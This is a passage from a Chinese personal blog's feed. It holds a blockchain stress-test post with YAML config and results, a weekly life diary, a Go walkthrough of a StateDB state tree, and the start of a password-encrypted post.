class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stress</span> <span class="hljs-string">test</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">This</span> <span class="hljs-string">is</span> <span class="hljs-string">a</span> <span class="hljs-string">stress</span> <span class="hljs-string">testing</span> <span class="hljs-string">of</span> <span class="hljs-string">Block</span> <span class="hljs-string">DAG.</span><br>  <span class="hljs-attr">clients:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">local</span><br>    <span class="hljs-attr">number:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">rounds:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">label:</span> <span class="hljs-string">create</span><br>      <span class="hljs-attr">description:</span> <span class="hljs-string">Test</span> <span class="hljs-string">performance</span> <span class="hljs-string">of</span> <span class="hljs-string">creating</span> <span class="hljs-string">txs</span><br>      <span class="hljs-attr">txNumber:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-number">15000</span><br>      <span class="hljs-attr">callback:</span> <span class="hljs-string">block-dag/stress-testing/create.js</span><br><span class="hljs-attr">monitor:</span><br>  <span class="hljs-attr">type:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span><br>  <span class="hljs-attr">docker:</span><br>    <span class="hljs-attr">name:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.1:6001</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.2:6001</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.3:6001</span><br>  <span class="hljs-attr">interval:</span> <span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>测试文件中主要包括两部分：</p><ul><li>测试内容配置</li></ul><p>test 项负责对测试内容进行配置。配置主要集中在 round 字段中指定如何对区块链系统进行测试。每一个测试可以包含多轮，每一轮可以向区块链发起不同的测试请求。<br>本次测试是对系统的 createTx 接口进行测试。在测试中，可以通过 txNumber 字段指定测试的交易发送数量</p><ul><li>性能监视器配置</li></ul><p>monitor 项负责对测试所使用的性能监视器的进行配置。每项配置项的解释如下：</p><ol><li>monitor.type，需要指定为 docker，指对 docker 容器进行监控；</li><li>monitor.docker.name，一个包含所有要监视的节点的 docker 容器名称列表；</li><li>monitor.interval，监视器的采样间隔，单位为秒。</li></ol><h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>实际测试中，我选择类似 Apache 的测试结果。<br>全是正常交易</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Tx Length:</span> <span class="hljs-number">217088</span> <span class="hljs-string">bytes</span>       <span class="hljs-string">交易数据的长度</span><br><span class="hljs-attr">Total Txs Number:</span> <span class="hljs-number">15000</span><br><span class="hljs-attr">Time taken for tests:</span> <span class="hljs-number">5.919</span> <span class="hljs-string">seconds</span>    <span class="hljs-string">所有这些交易发送完所花费的时间</span><br><span class="hljs-attr">Complete requests:</span> <span class="hljs-number">15000</span>             <span class="hljs-string">完成请求数</span><br><span class="hljs-attr">Failed requests:</span> <span class="hljs-number">0</span>                <span class="hljs-string">失败请求数</span><br><span class="hljs-attr">Write errors:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Total transferred:</span> <span class="hljs-number">3256320000</span> <span class="hljs-string">bytes</span>     <span class="hljs-string">网络总传输量</span><br><span class="hljs-attr">TPS:</span> <span class="hljs-number">2536.3</span> [<span class="hljs-comment">#/sec] (mean) 吞吐量-每秒交易数</span><br><span class="hljs-attr">Time per request:</span> <span class="hljs-number">1.513</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean</span>, <span class="hljs-string">across</span> <span class="hljs-string">all</span> <span class="hljs-string">concurrent</span> <span class="hljs-string">requests)</span> <span class="hljs-string">并发的每个请求平均消耗时间</span><br><span class="hljs-attr">Transfer rate:</span> <span class="hljs-number">67.15</span> [<span class="hljs-string">Mbytes/sec</span>] <span class="hljs-string">received</span> <span class="hljs-string">平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span><br></code></pre></td></tr></table></figure><p>说明:<br>Tx 长度为 212 kb，换算为字节是 217088 bytes</p><blockquote><p>用 nodejs 打印上述结果</p></blockquote><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-1.png#clientId=ue0d8159d-8879-4&from=paste&height=269&id=uf8e241e5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=538&originWidth=854&originalType=binary&size=66022&status=done&style=none&taskId=ua2f5d267-1fbc-46ce-a75d-7e48fa43834&width=427" alt="image.png"><br>打印区块<br>getMaxHeightBlock 接口–最高块<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-2.png#clientId=ue0d8159d-8879-4&from=paste&height=302&id=udab02a53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=599&originWidth=978&originalType=binary&size=115789&status=done&style=none&taskId=u2ed02707-9654-4dfb-8fb5-77517ad6a23&width=493" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-3.png#clientId=ue0d8159d-8879-4&from=paste&height=348&id=ubdbcfa19&margin=%5Bobject%20Object%5D&name=image.png&originHeight=679&originWidth=909&originalType=binary&size=108543&status=done&style=none&taskId=u82ff9afe-2c69-4356-9d50-5d83d492427&width=465.5" alt="image.png"><br>这里注意到，每个块包含 60 个交易，60*95=5700&gt;3000（为平均每节点分配到的交易量），这里存在几种原因：<br>① 在并发生成块的时候，由于节点间的速率差异与网络延迟而导致当时观察到的 Tip 集不同，而导致的区块高度高于预期高度。<br>② 由于处理交易的时候对于放在交易缓存池中的未打包交易进行转发操作，并标记为未打包，导致其中的一些交易被不同的节点重复打包，而导致打包交易量大于预期。</p><p>解释各个字段的含义</p><p>再通过 rpc 端口查询每个节点中各自存储的交易量<br>（发送 GET 请求到 channel 端口进行查询）</p><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-4.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=u7c0e6c3b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=808&originalType=binary&size=23484&status=done&style=none&taskId=u8db7b66d-e3cc-446c-ae3b-7416ee176a8&width=404" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-5.png#clientId=ue0d8159d-8879-4&from=paste&height=81&id=ud52b21b6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=812&originalType=binary&size=23217&status=done&style=none&taskId=u0c59e8b2-326d-4414-b250-f3334c30c2e&width=406" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-6.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=ue659a490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=805&originalType=binary&size=24212&status=done&style=none&taskId=u667e9356-a241-4ac0-9ab5-3676f248e40&width=402.5" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;对区块链进行性能测试&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-3-to-10</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/04/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/04/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10_new/</id>
    <published>2021-05-04T02:43:45.000Z</published>
    <updated>2021-11-14T09:12:27.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>五四青年节，知乎发布微电影《重逢》，讲述了关于肖思远烈士的事，回答了这样一个时代问题——“当代年轻人还有没有不计生死的热血”，我没有看影片，只看了些许回答就已经泣不成声，酸楚涌上心头，豆大的眼泪滴落许久。是的，我在床上浏览着手机，这和平的岁月，都是这群最可爱的人为我们负重前行换来的。身为青年一代，我何曾忘记报国之志，家国之情溢于言表，流淌着的热血，奔涌的黄河，人民在召唤，时代在召唤，吾辈当不负重任，砥砺前行。</li><li>B 站发布了新的演讲，这次的演讲十分淳朴，也十分有感染力，下面是演讲全文：</li></ol><p>那些想从我们身上 看到中国未来的人<br>亲爱的父母 师长 前辈<br>其实我还不知道 想成为什么样的人<br>但能和你们分享的是<br>我不想做什么样的人<br>我不想做一个拿着锯子的人<br>随时随地 把人群锯成两半<br>这一半是女人 那一半是男人<br>这一半是盟友 那一半是对手<br>对手赞同的我们必须反对<br>对手反对的我们必须赞同<br>不论对错 只争输赢<br>我不想做一个浑身带刺的人<br>嘲讽别人的成功 嘲笑别人的失败<br>看不惯过得比他好的人<br>看不起过得没他好的人<br>一肚子抱怨和借口<br>凡事不是自己的错 都是别人的错<br>我不想做一个 流水线上制造出来的人<br>没有独立的人格 只有预定的人设<br>没有闪光的才华 只有抛光的流量<br>没有精彩的作品 只有热闹的八卦<br>我不想做一个隐身的人<br>需要挺身而出的时候 他藏在人群里<br>需要解决问题的时候 他消失在所有人的视线里<br>我不想做一个油腻的人<br>你吃亏的时候他说吃亏是福<br>该较真的时候他说难得糊涂<br>是的，我不想做这样的人<br>我不想做一个没有同情心的人<br>一个不讲义气的人<br>一个没有教养的人<br>一个半途而废的人<br>一个遗忘历史的人<br>我不想 做一个不爱国的人<br>我不想做一个 口口声声 “一代不如一代”的人<br>当我变成父母 师长 前辈的时候<br>希望 我的孩子会对我说<br>我想成为你这样的人。</p><ol start="3"><li>盖茨离婚</li><li>狗狗币暴涨 300 倍，炒币的世界我不懂。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>朋友送的糕点很好吃，在阳光天地的西木栗子有卖。</li><li>买了一只大吉岭的香水小样还不知道什么味道。–越闻越好闻，前调的烟草味有点大，中调很有感觉，是那种草木香气。</li><li>立夏了，气温开始在 30 度徘徊了。</li><li>买了嘉华鲜花饼，送给老妈当母亲节礼物，玫瑰馅的应该挺好吃的？</li><li>去看了牙，医生说智齿都要拔掉。</li><li>去咨询了一下正畸医生，不太敢正畸了。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看知乎</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>伍六七第三季最后一集！《你是我想保护的人》，梅小姐这次选择拼尽全力保护阿柒，爱了爱了！而阿柒，用魔刀千刃给梅小姐的剑“续命”，真爱无疑！然而，剧情戛然而止了，挖了一堆坑，注意，是一堆坑！还要出大电影，还真就从一个爆款 IP 上面疯狂捞金呗。</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><blockquote><p>来自知乎：<strong>当代社会中，青年的五四精神会有哪些具体表现？</strong></p></blockquote><ul><li>第一点就是<strong>爱国</strong>，这一条都做不到也无从谈起。任何时候，爱国都是第一位，也是不能撼动的。</li><li>第二点就是<strong>敬业</strong>，做好本职工作，脚踏实地的工作，认认真真的工作，不要得陇望蜀，好高骛远。</li><li>第三点就是<strong>明志</strong>，志即志向或者理想，一个人要有自己的目标，不能得过且过，当一天和尚撞一天钟。作为青年，需要有自己的人生规划。</li><li>第四点就是<strong>静心</strong>，国家发展越来越快，社会节奏越来越快，快节奏的生活让人一夜暴富，一夜成名，这让许多人都变得越来越浮躁，内心静不下来，空中楼阁的繁华富贵让许多人迷失了自我。</li></ul><blockquote><p>这是从一篇 coolhash 测压的文章中看到的，作者说：“是存在差距，但是可以站着学习，而不是跪着膜拜，一味跟从只会丧失判断力和创新力，香港的年轻人曾经不相信大陆的 taobao 会比 eBay 强大，QQ 会比 MSN 强大，直到 MSN 垮了仍然不相信是真的，没有信心，没有努力，梦想只会变成做梦。”</p></blockquote><p>曾国藩：窃喜洋人之智巧，我中国人亦能为之，彼不能傲我以其所不知矣!</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>如何对区块链系统测试。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>又是一年青年节，在互联网多元文化的滋润下成长起来的新生代，给这个时代带来了新的课题，你不想成为一个什么样的人？</li></ol><p>我们总说，“君子有所为，有所不为”。年轻人何尝不是如此？<strong>那些非凡的勇气、思辨的精神、激扬的斗志，极尽人们对青春年华的无限想象；那些意志的消磨、生活的妥协、人生的沉沦，也在提醒人们对未老先衰的潜在担忧。</strong>从这个意义上来说，我们礼赞青年，不只是为了体现对青春年少的呵护，更是为了帮助青年扫除心灵的阴霾；我们歌颂青春，不只是为了了却人生苦短的遗憾，更是为了诠释时光荏苒的意义。要知道，青年人最大的资本，恰恰是最容易被自己忽视的青春；青春最值得的回忆，正是追逐梦想、成长奋斗的痕迹。<br>诗人塞缪尔·厄尔曼在《青春》中这样写道：“人人心中皆有一台天线，只要还能接受美好、希望、欢乐、勇气和力量的信号，就能青春永驻，风华常存。”<strong>架起这台心灵的“天线”，去感受日月星辰，去明辨是非曲直，去体悟人生百态，每一个成长的灵魂，就一定都能找到“你想成为怎样的人”和“我不想做这样的人”的完美答案。</strong><br><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10-1.jpeg#clientId=ud5d56b56-b62c-4&from=paste&height=505&id=u6ef2f665&margin=%5Bobject%20Object%5D&originHeight=1009&originWidth=679&originalType=url&status=done&style=none&taskId=ub78ac62c-0766-4032-984a-851d51f1c7e&width=339.5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;五四青年节，知乎发布微电影《重逢》，讲述了关于肖思远烈士的事，回答了这样一个时代问题——“当代年轻人还有没有不计生死的热血”，我</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>区块链底层-状态机StateDB</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB_new/</id>
    <published>2021-05-03T08:22:12.000Z</published>
    <updated>2021-11-14T09:16:01.012Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h1><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB-1.png#clientId=u1d1d90de-5c3e-4&from=paste&height=344&id=ub777611d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=688&originWidth=1306&originalType=binary&size=308117&status=done&style=none&taskId=u950bfa17-cd9c-4cde-b1d9-eb903342901&width=653" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB-2.png#clientId=u1d1d90de-5c3e-4&from=paste&height=200&id=u4a6a08ef&margin=%5Bobject%20Object%5D&name=image.png&originHeight=399&originWidth=969&originalType=binary&size=146076&status=done&style=none&taskId=ude525437-624d-4812-952f-2b51a1576ff&width=484.5" alt="image.png"></p><h1 id="创建状态树"><a href="#创建状态树" class="headerlink" title="创建状态树"></a>创建状态树</h1><p>状态数据库的定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StateDB <span class="hljs-keyword">struct</span> &#123;<br>db   Database  <span class="hljs-comment">//操作状态的底层数据库，在实例化 StateDB 时指定 ②。</span><br>trie trie.Trie <span class="hljs-comment">//世界状态所在的树实例对象</span><br>stateObjects      <span class="hljs-keyword">map</span>[account.Address]*account.StateObject <span class="hljs-comment">//已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</span><br>stateObjectsDirty <span class="hljs-keyword">map</span>[account.Address]<span class="hljs-keyword">struct</span>&#123;&#125;<span class="hljs-comment">//标记被修改过的账户</span><br>    dbErr  error<br>lock sync.Mutex<br>&#125;<br></code></pre></td></tr></table></figure><p>首先，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">db: = state.NewDatabase(levelDB)<br>statedb, err := state.New(block.Root(), db)<br></code></pre></td></tr></table></figure><p>这里的 New 函数为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//state/statedb.go:27</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(root hash.Hash, db Database)</span> <span class="hljs-params">(*StateDB, error)</span></span> &#123;<br>tr, err := db.OpenTrie(root)<span class="hljs-comment">//打开指定状态版本(root)的含世界状态的顶层树</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;StateDB&#123;<br>db:                db,<span class="hljs-comment">//②</span><br>trie:              tr,<br>stateObjects:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[account.Address]*stateObject),<br>        stateObjectsDirty: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[account.Address]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>preimages:         <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Hash][]<span class="hljs-keyword">byte</span>),<br>journal:           newJournal(),<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>世界态中的所有状态都是已账户为基础单位存在的，因此为了便于账户隔离管理，使用不开放的 stateObject 来维护某个账户下的状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StateObject <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//账户哈希</span><br>addrHash <span class="hljs-keyword">string</span><br>data     User <span class="hljs-comment">//账户属性</span><br><span class="hljs-comment">//底层数据库</span><br>db *state.StateDB<br><span class="hljs-comment">// 写缓存</span><br>trie Trie <span class="hljs-comment">// 存储树，第一次访问时初始化</span><br>&#125;<br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//账户地址</span><br>Address []<span class="hljs-keyword">byte</span><br><span class="hljs-comment">//账户余额</span><br>Amount <span class="hljs-keyword">float64</span><br><span class="hljs-comment">//交易个数</span><br>Nonce <span class="hljs-keyword">uint64</span><br><span class="hljs-comment">//storage树根哈希值</span><br>Root <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、底层数据库、存储树等内容。<br>在区块中，将交易作为输入条件，来根据一系列动作修改状态。 在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//将每个交易对应的的账户状态树进行修改</span><br>usr := getUserByAddress(t.Address)<br><span class="hljs-keyword">if</span> usr.Amount - t.Fee &lt;<span class="hljs-number">0</span> &#123;<br>    <span class="hljs-keyword">return</span> err<br>&#125;<br>usr.Nonce = usr.Nonce + <span class="hljs-number">1</span><br>uMPT := getMPT(usr.Root)<br>data := *(*[]<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;t))<br>uMPT.Put([]<span class="hljs-keyword">byte</span>(t.Hash),data)<br>usr.Root := uMPT.RootHash()<br></code></pre></td></tr></table></figure><p>在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// state/statedb.go:122</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *StateDB)</span> <span class="hljs-title">Commit</span><span class="hljs-params">(deleteEmptyObjects <span class="hljs-keyword">bool</span>)</span> <span class="hljs-params">(root hash.Hash, err error)</span></span> &#123;<br><span class="hljs-keyword">for</span> addr := <span class="hljs-keyword">range</span> s.journal.dirties &#123;<span class="hljs-comment">//①⑧⑨⑩</span><br>s.stateObjectsDirty[addr] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><span class="hljs-keyword">for</span> addr, stateObject := <span class="hljs-keyword">range</span> s.stateObjects &#123;<span class="hljs-comment">//②</span><br>_, isDirty := s.stateObjectsDirty[addr]<br><br>        <span class="hljs-keyword">if</span> isDirty&#123;<br><span class="hljs-comment">//如果集合中的账户有变更</span><br><span class="hljs-keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//⑤</span><br><span class="hljs-keyword">return</span> common.Hash&#123;&#125;, err<br>&#125;<br>s.updateStateObject(stateObject)<span class="hljs-comment">//需要提交此账户</span><br>  &#125;<br><span class="hljs-built_in">delete</span>(s.stateObjectsDirty, addr)<br>    &#125;<br>    &#125;<br><span class="hljs-comment">//...</span><br>root, err = s.trie.Commit(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(leaf []<span class="hljs-keyword">byte</span>, parent hash.Hash)</span> <span class="hljs-title">error</span></span> &#123;<span class="hljs-comment">//⑦</span><br><span class="hljs-keyword">var</span> account Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> account.Root != emptyRoot &#123;<br>s.db.TrieDB().Reference(account.Root, parent)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> root, err<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>因为在修改某账户信息是，将会记录变更流水（journal），因此在提交保存修改时只需要将在流水中存在的记录作为修改集 ①。</li><li>所有访问过的账户信息，均被记录在 stateObjects 中，只需要遍历此集合 ② 便可以提交所有修改。</li><li>处理完每个需要提交的账户内容外，最后需要将账户树提交 ⑦。在提交过程中涉及账户内容作为叶子节点，在发送变动时，将更新账户节点和父节点的关系。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;全局&quot;&gt;&lt;a href=&quot;#全局&quot; class=&quot;headerlink&quot; title=&quot;全局&quot;&gt;&lt;/a&gt;全局&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://image.hackerjerry.top/%E5%8C%BA%E</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-April-26-to-May-2</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-April-26-to-May-2_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-April-26-to-May-2_new/</id>
    <published>2021-05-01T09:59:24.000Z</published>
    <updated>2021-11-14T09:15:59.264Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7d1e173d467e0f96dfae2d0bdf42c7bf59874ff1804e710964683a03bf6578dd">9de868b583bc49e754b3988b9080d7cff3617e4ea1f7484b7ff0f17d01b646576c7b1fa404195957a625f7cba00813ad0f5a3a245f9596dec846358c3ff153e134df321e20a5271e9e642351f6a4b3a7374e0b6065baf324118a410453fd2e9a59ab43d342b7729dba375b0f93faca53c81868b77858a98f5e864d6eebb06c17342f3b03b6821a3043638994f26f43df61eeec033d86c19075e726ae29d60f7f0043e7ea5f48f247978affd46a8d42a267b7d9207dd29d378a6e306b194e194654c92f0dddc9c245c1605a3dfdadbe914a3b763aebdd5e3dc2687687c9fcca9f16e7db904651cde8a65eb0b13074ce369bbe64a761e7a7019af1e6f2458f891f670cfc2659a673ddc63b9a08edbf8ee07b68a85357f76966b75c1dd9eb671054876736ca2bdd696aa00c6b9eff7da20bc3cc6b79aab2d35277d24aafc4188a81c4aec3689adb70b1d385447db4bd246d342767a24c61378a05e61c064d7b19d43e1c01954c8c782a4ae5fd81d0406a595faf7bfec808902e812888d6bc6a25b014615b98c42a3cd5b0b1e5438ff0d2bab5f3dd8aadd184c72ed07bd543ef614d2e107bbcd2d3bdf1585f4503a88d75e65f0f6726a8f52aff25f1216390a7f2f452d87950a05cadfb2d575e5d8d9f2eee2c857ae53aad51003600db64d375b3f287ebf45791e275e17ac8946ed861108c6ad256da9264544f15194d4dff3f824a71b6a3d88a7c6347f560d9cab7545b0fd969126f70e91ae00ed1a39c83f11aae0eb7ef78db77c70d1fd5ca95b90acd1d7b2cab308b8ae4626e399ca35fab714ebb593928a59a033d2c0e4ee178b7434b5a5e23f4a909998f96052ac5e02a6bc8981e3b1258c9984879ce25d32ddd3796b055673d3b7be17f80fe054c65a250bfe0b9b676e9d2a82d226d79853cc73d1516465a9857cc748e44eb51b46b2ae5442d9c57710c6ab11d238e72e8982c50e8f06bbe2dd753d028721b691f1e0536951e2262b6108b836f821fe31db3627efb4ea111cf70713b1dcab9908d86d3a24e16a52de6c3f5631c7cf4cd789966d6bc3758b1b56a0960d79226607626107a3080fb664441fa949efecdf95b248b7073072983cb64b319ca8cf57ccfebbf8f5d467c8546b84857b4a7c9dabfb57f3021436706dd7526e7ee202ae7930c2c782ce5194e991ee2046ff49d3d70423921e9794267596944ef240ecd775c0cadc732057152938220425d6e7bc8e5a28b5a264d46ecd6e4fc779f31696e687bdbf31cfb15849e7a5ccd9fa494370be2009da01eb5af1a0965eb613c04338698467f01de8e8de66e0a0b8b233ced4b38c85e909e32cb8808fe5b93770e47398aabdaaa7c25c